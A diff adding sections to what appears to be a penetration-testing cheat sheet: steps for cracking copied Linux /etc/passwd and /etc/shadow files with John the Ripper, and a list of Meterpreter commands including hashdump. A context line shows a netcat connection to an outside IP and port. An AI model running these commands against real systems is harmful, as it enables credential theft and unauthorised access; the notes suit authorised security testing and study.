@@ -40,6 +40,22 @@ nc.exe 10.10.75.75 7777
 
 ### p0f
 
+### Joghn the Ripper
+
+John the Ripper is essentially a password cracking tool.  You can utilize John the Ripper to perform password cracking once you've retrieved password hashes from a target.
+
+First, you need to combine the passwd and shadow files (from a Linux machine).  The following examples assumes you've taken a copy of /etc/passwd and /etc/shadow and moved them to the /tmp directory:
+
+```
+./unshadow /tmp/passwd_copy /tmp/shadow_copy > /tmp/combined
+```
+
+Running John is trival:
+
+```
+./john /tmp/combined
+```
+
 ### Metasploit
 
 Starting Metasploit:
@@ -115,7 +131,18 @@ sessions -l
 sessions -i [session #]
 ```
 
+Popular Meterpreter Commands:
 
+```
+?
+sysinfo
+getuid
+pwd
+getpid
+ps
+hashdump
+run hashdump
+```
 
 
 
